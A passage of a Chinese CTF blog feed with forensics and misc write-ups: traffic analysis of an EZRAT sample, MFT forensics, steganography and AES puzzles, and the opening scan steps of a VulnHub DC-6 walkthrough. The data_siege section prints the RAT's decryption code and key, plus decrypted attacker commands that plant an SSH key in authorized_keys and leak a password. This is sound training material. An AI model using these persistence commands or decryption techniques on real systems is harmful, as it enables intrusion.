使用相应的密码进行解压 观察第一个解压的文件 应该是一个pdf文件 分成了15个部分 最后将这15个文件全部进行拼接 得到完整的pdf文件 在末尾找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122042924.png" alt="image-20240312204207845"></p><h3 id="data-siege"><a href="#data-siege" class="headerlink" title="data_siege"></a>data_siege</h3><pre><code>&quot;It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city&#39;s messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.&quot;</code></pre><p>题干告诉我们flag分为三部分 </p><p>附件是一个流量包  看了一眼协议分级  主要是TCP协议的流量包</p><p>看一下可以导出的HTTP对象 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141055864.png" alt="image-20240314105505835"></p><p>将这个<code>aQ4caZ.exe</code> 导出 直接放在010里面看 找到一部分字符串 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141056081.png" alt="image-20240314105640043"></p><pre><code>Very_S3cr3t_S</code></pre><p>开始以为这是一部分flag  后来发现这个不是 是AES加密密钥的盐值</p><p>追踪tcp流 在第五个包发现好像是base64的字符串 解一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141102380.png" alt="image-20240314110226319"></p><p>看到flag part3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141103418.png" alt="image-20240314110335330"></p><p>但是数据很乱  应该是前面有混淆字符 整理一下 重新解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141105217.png" alt="image-20240314110525109"></p><pre><code>0r3d_1n_7h3_h34dqu4r73r5&#125;</code></pre><p>到这一步 第五个包剩下的部分应该还是要进行解密 猜测是AES解密 但是解密密钥偏移值等信息 就是要分析上面提取出来的exe程序 进行逆向  这边要使用dnspy进行调试分析 </p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnspy下载安装</a></p><p>直接使用dnspy将<code>aQ4caZ.exe</code>打开 可以看到这个程序原本的名字是<code>EZRATClient</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161648741.png" alt="image-20240316164845657"></p><p>找到解密函数 </p><pre><code class="c#">public static string Decrypt(string cipherText)&#123;    string result;    try    &#123;        string encryptKey = Constantes.EncryptKey;        byte[] array = Convert.FromBase64String(cipherText);        using (Aes aes = Aes.Create())        &#123;            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]            &#123;                86,                101,                114,                121,                95,                83,                51,                99,                114,                51,                116,                95,                83            &#125;);            aes.Key = rfc2898DeriveBytes.GetBytes(32);            aes.IV = rfc2898DeriveBytes.GetBytes(16);            using (MemoryStream memoryStream = new MemoryStream())            &#123;                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))                &#123;                    cryptoStream.Write(array, 0, array.Length);                    cryptoStream.Close();                &#125;                cipherText = Encoding.Default.GetString(memoryStream.ToArray());            &#125;        &#125;        result = cipherText;    &#125;    catch (Exception ex)    &#123;        Console.WriteLine(ex.Message);        Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);        result = &quot;error&quot;;    &#125;    return result;&#125;</code></pre><p>里面提到的这个<code>encryptKey</code>  可以在下面找到<code>EZRATClient.Core--Constantes--_encryptKey</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161703743.png" alt="image-20240316170317697"></p><pre><code>VYAemVeO3zUDTL6N62kVA</code></pre><p>那解密函数在程序里面已经给了 需要用到的密钥也给了 只是这段解密代码缺少一部分对密文的输出和对解密 补上就可以</p><pre><code class="c#">using System;using System.IO;using System.Security.Cryptography;using System.Text;public static class Program&#123;    public static void Main(string[] args)    &#123;        // 测试解密方法        string cipherText = &quot;ZKlcDuS6syl4/w1JGgzkYxeaGTSooLkoI62mUeJh4hZgRRytOHq8obQ7o133pBW7BilbKoUuKeTvXi/2fmd4v+gOO/E6A0DGMWiW2+XZ+lkDa97VsbxXAwm0zhunRyBXHuo8TFbQ3wFkFtA3SBFDe+LRYQFB/Kzk/HX/EomfOj2aDYRGYBCHiGS70BiIC/gyNOW6m0xTu1oZx90SCoFel95v+vi8I8rQ1N6Dy/GPMuhcSWAJ8M9Q2N7fVEz92HWYoi8K5Zvge/7REg/5GKT4pu7KnnFCKNrTp9AqUoPuHm0cWy9J6ZxqwuOXTR8LzbwbmXohANtTGso6Dqbih7aai57uVAktF3/uK5nN7EgMSC0ZsUclzPZjm0r4ITE2HtBrRXJ78cUfIbxd+dIDBGts7IuDfjr0qyXuuzw+5o8pvKkTemvTcNXzNQbSWj+5tTxxly0Kgxi5MVT0ecyJfNfdZG0slqYHKaqJCZm6ShfvGRFsglKmenBB274sBdkVqIRtodB8dD1AM1ZQQX1MBMGDeCwFqc+ahch0x375U6Ekmvf2fzCZ/IaHOHBc8p5se1oNMRbIqcJaundh5cuYL/h8p/NPVTK9veu3Qihy310wkjg=&quot;; // 你的密文        string decryptedText = Decrypt(cipherText);        Console.WriteLine(&quot;Decrypted Text: &quot; + decryptedText);    &#125;    public static string Decrypt(string cipherText)    &#123;        string result;        try        &#123;            string key = &quot;VYAemVeO3zUDTL6N62kVA&quot;; // 添加密钥            byte[] array = Convert.FromBase64String(cipherText);            using (Aes aes = Aes.Create())            &#123;                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, new byte[]                &#123;                    86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83                &#125;);                aes.Key = rfc2898DeriveBytes.GetBytes(32);                aes.IV = rfc2898DeriveBytes.GetBytes(16);                using (MemoryStream memoryStream = new MemoryStream())                &#123;                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))                    &#123;                        cryptoStream.Write(array, 0, array.Length);                    &#125;                    byte[] decryptedBytes = memoryStream.ToArray();                    result = Encoding.UTF8.GetString(decryptedBytes); // 使用UTF-8编码解码明文                &#125;            &#125;        &#125;        catch (Exception ex)        &#123;            Console.WriteLine(ex.Message);            Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);            result = &quot;error&quot;;        &#125;        return result;    &#125;&#125;// Decrypted Text: cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB&#123;c0mmun1c4710n5 &gt;&gt; C:\Users\svc01\.ssh\authorized_keys</code></pre><p>出来了flag1  后面继续对tcp流5中的内容进行解密 得到flag2</p><pre><code class="c#">zVmhuROwQw02oztmJNCvd2v8wXTNUWmU3zkKDpUBqUON+hKOocQYLG0pOhERLdHDS+yw3KU6RD9Y4LDBjgKeQnjml4XQMYhl6AFyjBOJpA4UEo2fALsqvbU4Doyb/gtg// Decrypted Text: cmd;C:\;Username: svc01 Password: Passw0rdCorp5421 2nd flag part: _h45_b33n_r357</code></pre><p>完整flag</p><pre><code>HTB&#123;c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5&#125;</code></pre><h3 id="Pursue-The-Tracks"><a href="#Pursue-The-Tracks" class="headerlink" title="Pursue The Tracks"></a>Pursue The Tracks</h3><pre><code>Luxx, leader of The Phreaks, immerses himself in the depths of his computer, tirelessly pursuing the secrets of a file he obtained accessing an opposing faction member workstation. With unwavering determination, he scours through data, putting together fragments of information trying to take some advantage on other factions. To get the flag, you need to answer the questions from the docker instance.</code></pre><p>题目告诉我们 如果想要拿到flag  需要回答docker容器里面的问题 </p><p>给到的附件是一个MFT文件 是NTFS文件系统的备份文件 </p><pre><code>MFT，全称Master File Table，即主文件表，它是NTFS文件系统的核心。它是包含了NTFS卷中所有文件信息的数据库，在$MFT中每个文件（包括MFT本身）至少有一个MFT，记录着该文件的各种信息。这些信息被称为属性。NTFS使用MFT条目定义它们对应的文件，有关文件的所有信息，比如大小、时间、权限等都存在MFT条目中，或者由MFT条目描述存储在MFT外部的空间中。MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT项占用1024字节的空间。这个概念相当于Linux中的inode，File Record在$MFT文件中物理上是连续的，且从0开始编号，每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。</code></pre><p>为了更直接的读取MFT文件中的信息 我们使用下面这个项目  可以将MFT中的信息进行解析  并将结果保存在csv表格文件中</p><p><a href="https://github.com/jschicht/Mft2Csv">Mft2Csv</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131723127.png" alt="image-20240313172337050"></p><p>打开第一个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724670.png" alt="image-20240313172408605"></p><p>使用nc 连接docker容器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724852.png" alt="image-20240313172442588"></p><p>第一个问题</p><pre><code>Files are related to two years, which are those? (for example: 1993,1995)</code></pre><p>直接在表格里面看 看到两个文件夹 一个名为2023 一个名为2024 那就是这两个年份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131740311.png" alt="image-20240313174026188"></p><pre><code>2023,2024</code></pre><p>第二个问题</p><pre><code>There are some documents, which is the name of the first file written? (for example: randomname.pdf)</code></pre><p>问的是第一个写入的文件名是  这个直接在表格里面找到第一个出现的文件即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131741366.png" alt="image-20240313174159253"></p><pre><code>Final_Annual_Report.xlsx</code></pre><p>第三个问题</p><pre><code>Which file was deleted? (for example: randomname.pdf)</code></pre><p>问的是哪个文件被删除了 这个其实就是找不同 在表格列出的文件中 可以看到<code>Marketing_Plan.xlsx</code>这个文件 第六列的数字是2  但是其他文件都是1 找到对应列的属性 是<code>HEADER_SequenceNo</code>  我们大概可以理解为是一个状态码 2表示这个文件是删除状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131745378.png" alt="image-20240313174556256"></p><pre><code>Marketing_Plan.xlsx</code></pre><p>第四个问题</p><pre><code>How many of them have been set in Hidden mode? (for example: 43)</code></pre><p>问的是有多少个文件处在被隐藏状态 第15列的属性是<code>SI_FilePermission</code> 表示文件权限 找到<code>credentials.txt</code>  这个文件在第15列的值是<code>hidden</code> 表明这个文件此时是处在隐藏状态  在所有文件中 只有这一个文件在第15列的值是<code>hidden</code> 因此 只有1个文件处在隐藏状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131751419.png" alt="image-20240313175137292"></p><pre><code>1</code></pre><p>第五个问题</p><pre><code>Which is the filename of the important TXT file that was created? (for example: randomname.txt)</code></pre><p>问的是被创建的重要的txt文件格式的文件名是什么</p><p>只有一个txt文件类型的文件  就是上一题的<code>credentials.txt</code></p><pre><code>credentials.txt</code></pre><p>第六个问题</p><pre><code>A file was also copied, which is the new filename? (for example: randomname.pdf)</code></pre><p>问的是被复制的文件的文件名是什么  也是观察文件的属性 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132109266.png" alt="image-20240313210919189"></p><p>注意到这个值 其他文件都是0 那这个属性应该就是代表着被复制过的文件</p><pre><code>Financial_Statement_draft.xlsx</code></pre><p>第七个问题</p><pre><code>Which file was modified after creation? (for example: randomname.pdf)</code></pre><p>问的是哪个文件在创建后被修改 这个就是观察时间即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132114714.png" alt="image-20240313211413625"></p><p>只有<code>Project_Proposal.pdf</code>的时间发生了改变  那就是在第一次写入或者保存之后被修改了</p><pre><code>Project_Proposal.pdf</code></pre><p>第八个问题</p><pre><code>What is the name of the file located at record number 45? (for example: randomname.pdf)</code></pre><p>问的就是文件编号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132115001.png" alt="image-20240313211553934"></p><pre><code>Annual_Report.xlsx</code></pre><p>第九个问题</p><pre><code>What is the size of the file located at record number 40? (for example: 1337)</code></pre><p>问的是编号40的文件的文件大小</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132116100.png" alt="image-20240313211641061"></p><pre><code>57344</code></pre><p>答完所有问题之后 成功拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132117686.png" alt="image-20240313211708636"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTBCyberCTF2024&quot;&gt;&lt;a href=&quot;#HTBCyberCTF2024&quot; class=&quot;headerlink&quot; title=&quot;HTBCyberCTF2024&quot;&gt;&lt;/a&gt;HTBCyberCTF2024&lt;/h1&gt;&lt;h2 id=&quot;Forensics-部分&quot;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2023年中国工业互联网安全大赛决赛-misc</title>
    <link href="http://w3nx1z1.github.io/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/"/>
    <id>http://w3nx1z1.github.io/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/</id>
    <published>2024-03-03T12:36:18.167Z</published>
    <updated>2024-03-03T12:41:55.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年中国工业互联网安全大赛决赛-misc"><a href="#2023年中国工业互联网安全大赛决赛-misc" class="headerlink" title="2023年中国工业互联网安全大赛决赛-misc"></a>2023年中国工业互联网安全大赛决赛-misc</h1><pre><code>刷csdn看到了这个比赛 顺手下了附件也来做一做</code></pre><h2 id="DNS-Query-DNS流量提取数据-二维码"><a href="#DNS-Query-DNS流量提取数据-二维码" class="headerlink" title="DNS_Query(DNS流量提取数据 二维码)"></a>DNS_Query(DNS流量提取数据 二维码)</h2><p>拿到一个dns流量 看到info里面有东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011416656.png" alt="image-20240301141629512"></p><p>但是每两条里面的info都是一样的 那我们先过滤一下</p><pre><code>frame.len == 142</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011417055.png" alt="image-20240301141757969"></p><p>写tshark语句把里面的信息提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011418609.png" alt="image-20240301141844558"></p><pre><code>tshark -r DNS_Query.pcapng -T fields -Y &quot;frame.len == 142&quot; -e &quot;dns.qry.name&quot; | awk &#39;&#123;print substr($0,0,29)&#125;&#39; | tr -d &#39;\n&#39; &gt;data.txt</code></pre><pre><code>-Y 是筛选数据包-e 由上图可以看到我们想要提取的数据是在queries的name字段的awk 对提取出来的文本进行处理 提取从第一个字符开始的连续29个字符 这里我们只需要数字部分tr 进一步处理将每行后面的换行符去掉</code></pre><p>猜测这段字符是二维码 写脚本进行转化</p><pre><code class="python">from PIL import Imagefrom zlib import *MAX = 29pic = Image.new(&quot;RGB&quot;, (MAX, MAX))str1 = &quotquot;i = 0for y in range(0, MAX):    for x in range(0, MAX):        if str1[i] == &#39;1&#39;:            pic.putpixel([x, y], (0, 0, 0))        else:            pic.putpixel([x, y], (255, 255, 255))        i = i+1pic.show()pic.save(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011422724.png" alt="image-20240301142248689"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011423480.png" alt="image-20240301142320432"></p><h2 id="gigached-lsb隐写-AES加解密"><a href="#gigached-lsb隐写-AES加解密" class="headerlink" title="gigached(lsb隐写 AES加解密)"></a>gigached(lsb隐写 AES加解密)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011423883.png" alt="image-20240301142346826"></p><p>压缩包里面有注释 应该是一段加密逻辑 但是我拿到的附件是已经被解压的了 只能看wp里面的了</p><pre><code class="python">def encrypt(key, source):    source = source.encode()    key = key.encode()    key = SHA256.new(key).digest()    IV = Random.new().read(AES.block_size)     encryptor = AES.new(key, AES.MODE_CBC, IV)    padding = AES.block_size - len(source) % AES.block_size      source += bytes([padding]) * padding      data = IV + encryptor.encrypt(source)      return data</code></pre><p>给的这个文件 先看一下类型 是一个iso media</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011712296.png" alt="image-20240301171240260"></p><p>改个后缀名 使用ffmpeg或者foremost 进行分帧 题目介绍是lsb on movie 那视频文件没法进行lsb隐写 估计是在视频的某几帧里面进行lsb隐写</p><pre><code>foremost gigached     或者ffmpeg -i gigached ./output/outr%04d.png</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011941137.png" alt="image-20240301194149977"></p><p>直接使用stegsolve或者zsteg提取隐藏信息就可以了</p><pre><code>8:dp6UYHfO8:NZhyAEYx8:Js8o30248:l+je3k5k8:aJmsL+Hx8:w43oQ3oz8:XjTT3/LQ8:qF4fuu/w8:MNqZVqiA8:Q3vzixxY8:QYbnuQ==8: the key8: isgYpt38:GvM7X1A13:CoT</code></pre><p>将这个内容写入<code>1.txt</code> 写个脚本处理一下</p><pre><code class="python">with open(&quot;1.txt&quot;, &#39;r+&#39;) as f:    line = f.readlines()    new_lines = []    for i in line:        i = i[2:10:1]        new_lines.append(i)    f.writelines(new_lines)</code></pre><pre><code>dp6UYHfONZhyAEYxJs8o3024l+je3k5kaJmsL+Hxw43oQ3ozXjTT3/LQqF4fuu/wMNqZVqiAQ3vzixxYQYbnuQ== the key isgYpt3GvM7X1A1CoT</code></pre><p>根据前面的加密方式写解密脚本</p><pre><code class="python">from Crypto.Cipher import AESfrom Crypto.Hash import SHA256from Crypto import Randomimport base64def decrypt(key, data):    data = base64.b64decode(data)    key = key.encode()    key = SHA256.new(key).digest()    IV = data[:AES.block_size]    decryptor = AES.new(key, AES.MODE_CBC, IV)    decrypted = decryptor.decrypt(data[AES.block_size:])    padding_length = decrypted[-1]    decrypted = decrypted[:-padding_length]    return decrypted.decode()encrypted_data = &quot;dp6UYHfONZhyAEYxJs8o3024l+je3k5kaJmsL+Hxw43oQ3ozXjTT3/LQqF4fuu/wMNqZVqiAQ3vzixxYQYbnuQ==&quot;key = &quot;gYpt3GvM7X1A1CoT&quot;decrypted_text = decrypt(key, encrypted_data)print(decrypted_text)# flag&#123;d53dbf36-444a-471d-a663-91a9e6f400e0&#125;</code></pre><h2 id="hellofromspace-udp流量提取图片-图片异或"><a href="#hellofromspace-udp流量提取图片-图片异或" class="headerlink" title="hellofromspace(udp流量提取图片 图片异或)"></a>hellofromspace(udp流量提取图片 图片异或)</h2><p>打开流量包 看一下协议分级 基本上全是UDP 那就直接追踪一下UDP流 看到两部分flag 一个在<code>flag_part1.txt</code>中 一个在<code>flag_part2.png</code>中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021615238.png" alt="image-20240302161547156"></p><p>追踪udp流发现只有一个流 第一部分flag可以直接在里面搜出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021623120.png" alt="image-20240302162340041"></p><pre><code>flag&#123;c0ee07da-246d</code></pre><p>将数据形式改为原始数据 在010editor里面保存为新文件 <code>1.png</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021618493.png" alt="image-20240302161829428"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021629554.png" alt="image-20240302162905511"></p><p>看着有点不对劲  很明显是缺少了完整的图片结构 但是末尾也确实有正确的图片尾</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021631430.png" alt="image-20240302163127383"></p><p>猜测是中间的部分出了问题 返回去在看一下 图片头是出现在长度为1189的包中的 后面也有很多长度为1189的包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021632497.png" alt="image-20240302163215440"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021633081.png" alt="image-20240302163316025"></p><p>png头是从第12个字节出现的 观察下一个长度为1189的包 看到第10个字节数字加了1 看来是计数的 使用的是16进制计数法 顺序计数 那就不用再单独排序了 考虑到文件尾是出现在长度为289的包 那我们就筛选长度&gt;&#x3D;289的包</p><pre><code>udp &amp;&amp; frame.len &gt;= 289</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021636814.png" alt="image-20240302163643722"></p><p>tshark提一下数据</p><pre><code>tshark -r hello.pcapng -T fields -Y &quot;udp &amp;&amp; frame.len &gt;= 289&quot; -e &quot;data.data&quot; | awk &#39;&#123;print substr($0,23)&#125;&#39; &gt; hex.txt </code></pre><p>再把数据放在010里面转储为png图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021701046.png" alt="image-20240302170117632"></p><p>看起来和题目附件里面的<code>original.png</code>一样 猜测是双图盲水印  但尝试过后发现不是 是两张图片异或 使用stegsolve就可以 先打开一张图片 再点Analyse–Image Combiner</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021706412.png" alt="image-20240302170653378"><br>得到一张图片 隐隐约约看到后半段flag </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021707241.png" alt="image-20240302170757151"></p><p>将其保存下来 找个看的清楚的通道</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021709425.png" alt="image-20240302170937373"></p><h2 id="threepages-苹果png解析bug-lsb隐写-js函数调用"><a href="#threepages-苹果png解析bug-lsb隐写-js函数调用" class="headerlink" title="threepages(苹果png解析bug lsb隐写 js函数调用)"></a>threepages(苹果png解析bug lsb隐写 js函数调用)</h2><p>拿到流量包 看一下http导出 关键的文件就是三个html文件<code>page1.html page2.html page3.html</code>  提取出来看看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022123964.png" alt="image-20240302212349935"></p><p>得到key1</p><pre><code>f79accc3ae844981</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022044688.png" alt="image-20240302204431462"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022124478.png" alt="image-20240302212413361"></p><p>扫码得到一段话</p><pre><code>Do you know some picture will be displayed differently on different devices?</code></pre><p>指的是在不同设备上显示不同的图片 搜了一下 是苹果png解析bug</p><p><a href="https://moonvy.com/blog/post/2021/%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%AE%BE%E5%A4%87%E4%B8%8A%E6%98%BE%E7%A4%BA%E4%B8%8D%E4%B8%80%E6%A0%B7%E5%86%85%E5%AE%B9%E7%9A%84%E7%A5%9E%E5%A5%87PNG%E5%9B%BE%E7%89%87/">在不同设备上显示不一样内容的神奇图片</a></p><p>找一个识别网站<a href="https://fotoforensics.com/">在线识别</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022134056.png" alt="image-20240302213418896"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022134489.png" alt="image-20240302213429375"></p><p>找个在线网站读一下条形码  <a href="https://online-barcode-reader.inliteresearch.com/default.aspx">在线读条形码</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022137997.png" alt="image-20240302213748954"></p><pre><code>here is your key2: 818facca67289de2</code></pre><p>还提取出来一个<code>p2.png</code>  常规的png图片分析方法  看一下有没有lsb隐写 发现在alpha的全部通道均存在隐藏信息 </p><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032018849.png" alt="image-20240303201804803"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032018879.png" alt="image-20240303201812836"></p><p>选择<code>save bin</code> 将信息提取出来 解base64得到源码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032019146.png" alt="image-20240303201911078"></p><p>我们查看page2.html的内容 发现影响返回值的结果的是<code>processDecrypt()</code>函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032024302.png" alt="image-20240303202438259"></p><p>源码里面有关于这个函数的内容</p><pre><code class="javascript">function processDecrypt()&#123;var r=document.getElementById(&quot;key1&quot;).value,e=document.getElementById(&quot;key2&quot;).value;let t=document.getElementById(&quot;message&quot;);try&#123;t.innerText=myDecrypt(r,e)&#125;catch(r)&#123;t.innerText=&quot;error&quot;&#125;&#125;</code></pre><p>那我们直接将我们得到的key1和key2赋予r和e两个参数即可</p><pre><code class="javascript">function processDecrypt()&#123;var r=&quot;f79accc3ae844981&quot;,e=&quot;818facca67289de2&quot;;let t=document.getElementById(&quot;message&quot;);try&#123;t.innerText=myDecrypt(r,e)&#125;catch(r)&#123;t.innerText=&quot;error&quot;&#125;&#125;</code></pre><p>直接将赋值后的代码替换掉源码里面的部分 替换后将源码的全部复制进控制台 在调用<code>processDecrypt()</code>函数即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032029143.png" alt="image-20240303202958990"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年中国工业互联网安全大赛决赛-misc&quot;&gt;&lt;a href=&quot;#2023年中国工业互联网安全大赛决赛-misc&quot; class=&quot;headerlink&quot; title=&quot;2023年中国工业互联网安全大赛决赛-misc&quot;&gt;&lt;/a&gt;2023年中国工业互联网安全大赛决</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-6</title>
    <link href="http://w3nx1z1.github.io/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/"/>
    <id>http://w3nx1z1.github.io/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/</id>
    <published>2024-02-29T02:34:41.927Z</published>
    <updated>2024-02-29T02:34:42.007Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-6"><a href="#vulnhub靶场DC-6" class="headerlink" title="vulnhub靶场DC-6"></a>vulnhub靶场DC-6</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This isn&#39;t an overly difficult challenge so should be great for beginners.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401171832816.png" alt="image-20240117183209736"></p><p>扫到ip为192.168.160.157 开放了22和80端口</p><p>在扫描靶机端口</p><pre><code>nmap -A -p- -v 192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401171834090.png" alt="image-20240117183420041"></p><pre><code>开放22端口 存在ssh服务 OpenSSH版本 7.4p1开放80端口 存在web服务 使用Apache中间件 版本2.4.25</code></pre><h3 id="二、修改hosts文件-进行重定向"><a href="#二、修改hosts文件-进行重定向" class="headerlink" title="二、修改hosts文件 进行重定向"></a>二、修改hosts文件 进行重定向</h3><p>我们可以看到在扫到的80端口处 说明了不能直接定向到目标网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401181745520.png" alt="image-20240118174515479"></p><p>我们尝试访问网站  当然也是访问不了的 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401181744269.png" alt="image-20240118174402203"></p><p>那就需要我们修改本地hosts文件(&#x2F;etc&#x2F;hosts)  将ip和域名添加进去</p><pre><code>192.168.160.157 wordy</code></pre><p>就可以成功访问了 (访问192.168.160.157)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182157924.png" 